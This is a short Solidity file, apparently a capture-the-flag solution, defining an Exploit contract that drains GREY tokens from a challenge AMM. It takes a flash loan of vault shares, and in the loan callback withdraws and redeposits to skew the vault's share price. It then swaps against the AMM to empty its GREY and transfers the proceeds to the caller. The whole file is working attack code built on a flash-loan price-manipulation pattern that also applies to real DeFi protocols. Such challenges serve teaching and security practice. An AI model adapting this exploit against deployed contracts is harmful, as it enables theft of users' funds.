// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup } from "./Setup.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Flash loan 1000 SV from the AMM
        setup.amm().flashLoan(true, 1000e18, "");

        // Drain 1000 GREY from the AMM
        setup.amm().swap(true, 0, 1000e18);

        // Transfer all GREY to msg.sender
        setup.grey().transfer(
            msg.sender, 
            setup.grey().balanceOf(address(this))
        );
    }

    function onFlashLoan(uint256 svAmount, bytes calldata) external {
        // Burn 1000 SV for 2000 GREY
        setup.vault().withdraw(svAmount);
        
        // Deposit 1000 GREY for 1000 SV. Share price is now 1:1
        setup.grey().approve(address(setup.vault()), 1000e18);
        setup.vault().deposit(1000e18);

        // Approve SV for AMM to return the flash loan
        setup.vault().approve(address(setup.amm()), svAmount);
    }
}